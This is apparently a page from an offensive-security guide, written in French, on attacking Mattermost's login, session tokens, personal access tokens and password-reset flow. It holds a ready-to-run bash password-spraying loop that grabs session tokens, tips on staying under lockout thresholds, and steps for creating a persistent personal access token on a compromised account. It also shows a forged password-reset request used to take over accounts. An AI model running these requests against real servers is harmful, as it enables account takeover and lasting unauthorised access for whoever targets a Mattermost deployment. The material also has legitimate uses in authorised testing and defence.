---
title: "Authentification"
order: 2
description: "Attaquer la couche d'authentification de Mattermost : POST /api/v4/users/login renvoie une session dans l'en-tête de réponse Token et le cookie MMAUTHTOKEN, donc le spraying est une boucle sur ce point de terminaison qui lit l'en-tête. Couvre la gestion des sessions et des jetons d'accès personnels, les failles SSO et MFA, et le flux /api/v4/users/password/reset. Login curl détaillé lisant l'en-tête Token, une boucle de spray, et l'interprétation d'un 200 par rapport à un 401."
keywords:
  - mattermost login
  - mmauthtoken
  - password spraying
  - personal access token
  - password reset
---

# Authentification

Chaque appel `/api/v4` authentifié a besoin d'un jeton de session, et les seules façons d'en obtenir un sont la connexion par mot de passe, un jeton d'accès personnel, ou un échange SSO. Le point de terminaison de connexion est une cible de spray propre parce qu'il n'est pas limité en débit sur de nombreuses versions et renvoie le jeton directement dans un en-tête de réponse, de sorte qu'une devinette réussie vous remet un identifiant Bearer immédiatement utilisable sans second aller-retour.

## Le flux de connexion et où atterrit le jeton

`POST /api/v4/users/login` prend `login_id` (nom d'utilisateur ou e-mail) et `password`. En cas de succès, le corps est l'objet utilisateur, et le jeton de session est renvoyé à la fois dans l'en-tête de réponse `Token` et sous forme de cookie `MMAUTHTOKEN` :

```http
POST /api/v4/users/login HTTP/1.1
Host: target:8065
Content-Type: application/json

{"login_id":"j.doe@corp.test","password":"Autumn2026!"}
```

```text
HTTP/1.1 200 OK
Token: kp8w3mz7...         <-- this is your session token
Set-Cookie: MMAUTHTOKEN=kp8w3mz7...; HttpOnly
X-Version-Id: 9.5.0...
```

Lisez l'en-tête `Token`, pas le corps, pour l'identifiant. Utilisez-le comme `Authorization: Bearer kp8w3mz7...` sur chaque appel ultérieur. Un `401` avec `id":"api.user.login.invalid_credentials_email_username"` est une devinette ratée.

## Spraying

Parce que le jeton est dans l'en-tête sur un `200`, une boucle de spray est une passe unique qui signale les succès par le statut et capture le jeton dans la même requête :

```bash
PASS='Autumn2026!'
while read u; do
  tok=$(curl -sk -D - -o /dev/null -X POST http://<target>:8065/api/v4/users/login \
        -H 'Content-Type: application/json' \
        -d "{\"login_id\":\"$u\",\"password\":\"$PASS\"}" | awk 'tolower($1)=="token:"{print $2}')
  [ -n "$tok" ] && echo "HIT $u -> $tok"
done < users.txt
```

Interprétation : toute ligne affichant `HIT` est à la fois un identifiant valide et un jeton de session actif. Gardez le débit bas et le mot de passe commun à toute la liste d'utilisateurs (un mot de passe, de nombreux utilisateurs) pour éviter le verrouillage par compte que certaines versions appliquent après des échecs répétés contre un seul compte. La MFA, lorsqu'elle est activée, transforme le `200` en une réponse `MFA required` (`id":"mfa.validate_token...`) de sorte qu'un succès de spray sur un compte MFA prouve quand même le mot de passe même si le jeton est retenu.

## Jetons d'accès personnels

Les jetons d'accès personnels sont des jetons Bearer à longue durée de vie, sans expiration. Là où `EnableUserAccessTokens` est activé, tout utilisateur (ou vous, sur un compte compromis) peut en créer un pour la persistance :

```http
POST /api/v4/users/me/tokens HTTP/1.1
Host: target:8065
Authorization: Bearer <session-token>
Content-Type: application/json

{"description":"ci"}
```

Le champ `token` de la réponse est un identifiant qui survit à la déconnexion et au changement de mot de passe, ce qui en fait le point d'ancrage privilégié à conserver. Un jeton volé (via l'IDOR d'énumération, une requête journalisée, ou la configuration de webhook/intégration) s'utilise de façon identique.

## Réinitialisation de mot de passe

`POST /api/v4/users/password/reset` consomme un `code` de réinitialisation et un nouveau mot de passe ; `POST /api/v4/users/password/reset/send` déclenche l'e-mail. La valeur offensive réside dans la gestion du jeton : là où le `code` de réinitialisation est dérivé de matériel prévisible (identifiant utilisateur plus un secret de signature faible ou divulgué, que la traversée de fichier de configuration dans l'[exploitation serveur](server-exploitation.md) peut exposer), le code peut être forgé, convertissant « je connais l'e-mail » en prise de contrôle de compte sans accès à la boîte de réception :

```http
POST /api/v4/users/password/reset HTTP/1.1
Host: target:8065
Content-Type: application/json

{"code":"<reset-token>","new_password":"Owned-Passw0rd!"}
```

Un `200` signifie que le mot de passe a été changé ; connectez-vous avec le nouveau mot de passe pour prendre le compte.

## Suite

Tout jeton obtenu ici est l'entrée de tout le reste : fournissez-le aux lectures d'annuaire de l'[énumération](enumeration.md), et si le compte porte `system_admin` (ou si vous réinitialisez le mot de passe d'un administrateur), passez directement à l'exécution de code par upload de plugin dans l'[exploitation serveur](server-exploitation.md).

## Outils

- [mattermost/mattermost (server source, to read the login and token handlers per build)](https://github.com/mattermost/mattermost)
- Burp Intruder ou la boucle `curl` ci-dessus pour le spraying.

## Références

- [Mattermost API: login and sessions](https://api.mattermost.com/#tag/authentication)
- [Mattermost API: personal access tokens](https://api.mattermost.com/#tag/users)
- [Mattermost documentation: personal access tokens](https://developers.mattermost.com/integrate/reference/personal-access-token/)
